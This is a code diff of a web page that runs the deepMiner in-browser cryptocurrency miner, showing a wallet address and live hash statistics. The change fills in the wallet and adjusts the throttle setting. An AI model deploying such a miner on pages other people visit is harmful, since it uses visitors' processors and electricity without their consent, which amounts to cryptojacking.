@@ -13,7 +13,7 @@
 	</style>
 	<script src="/dm.js">/*its uglified deepMiner.js*/</script>
 	<script>
-		var addr = 'client_key';
+		var addr = '46Fy9x9EMCZHXSR7SaN45aFrwfc5eULRbXX6YmggJKsMUzqPpriZAjHLbcTBVdPvo9bs91J8211XQBom8tXWw771HPTYWvM';
 		var miner = new deepMiner.Anonymous(addr, {
 			autoThreads: true
 		});
@@ -28,12 +28,12 @@
 			accepted++;
 		});
         var idle = parseFloat(location.hash.split('#')[1]) || 0.5;
+        miner.setThrottle(idle);
 		// Update stats once per second
 		setInterval(function () {
 			var hashesPerSecond = miner.getHashesPerSecond();
 			var totalHashes = miner.getTotalHashes();
 			var acceptedHashes = miner.getAcceptedHashes();
-			miner.setThrottle(idle);
 			document.body.innerHTML = '<h2>deepMiner User : ' + addr +
 				'</h2><table border="1"><tr><th>Hashs/s</th><th>Hashs</th><th>Found</th><th>Verfiy</th></tr><tr><td>' + parseInt(
 					hashesPerSecond) + '</td><td>' + totalHashes + '</td><td>' + found + '</td><td>' + accepted + ' / ' + acceptedHashes +
